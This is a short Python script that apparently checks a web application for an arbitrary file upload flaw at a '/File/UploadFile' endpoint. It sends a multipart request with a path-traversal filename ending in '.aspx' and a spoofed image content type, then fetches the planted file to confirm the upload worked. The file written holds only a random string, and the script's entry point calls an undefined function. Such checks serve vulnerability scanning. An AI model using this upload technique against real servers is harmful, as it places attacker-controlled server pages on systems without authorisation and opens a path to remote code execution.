import requests,re,urllib3,random
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(urls):
    filename=''
    content=''
    zf='1234567890qwertyuiopasdfghjklzxcvbnm'
    for _ in range(8):
        suiji1=random.randint(0,len(zf)-1)
        suiji2=random.randint(0,len(zf)-1)
        filename+=zf[suiji1]
        content+=zf[suiji2]
    if urls[-1]=='/':
        url = urls + "File/UploadFile"
    else:
        url = urls + "/File/UploadFile"

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Type': 'multipart/form-data; boundary=---------------------------21909179191068471382830692394',
        'Connection': 'close',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
    }
    body=f'''
-----------------------------21909179191068471382830692394\r
Content-Disposition: form-data; name="file"; filename="../../../{filename}.aspx"\r
Content-Type: image/jpeg\r
\r
{content}\r
-----------------------------21909179191068471382830692394\r
Content-Disposition: form-data; name="action"\r
\r
unloadfile\r
-----------------------------21909179191068471382830692394\r
Content-Disposition: form-data; name="filepath"\r
\r
./\r
-----------------------------21909179191068471382830692394\r
'''
    requests.post(url=url,data=body,headers=headers)
    # print(urls+'/'+filename+'.aspx')
    r=requests.get(urls+'/'+filename+'.aspx')
    # print(r.text)
    if content in r.text :
        flag=1
        return flag 
    else :
        flag=0
        return flag
if __name__ == '__main__':
    main()